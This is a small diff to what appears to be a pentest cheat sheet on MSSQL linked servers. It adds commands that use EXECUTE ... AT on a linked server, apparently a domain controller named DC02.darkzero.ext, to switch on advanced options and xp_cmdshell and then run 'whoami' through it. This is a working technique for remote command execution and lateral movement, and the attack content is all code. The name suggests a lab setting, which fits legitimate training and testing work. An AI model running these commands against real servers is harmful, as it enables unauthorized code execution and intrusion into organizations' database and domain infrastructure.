@@ -76,6 +76,11 @@ enum_links
 ```
 SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
 
+EXECUTE('SELECT @@version') AT [DC02.darkzero.ext];
+EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
+EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
+EXECUTE('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
+
 use_link SQL07
 ```
 
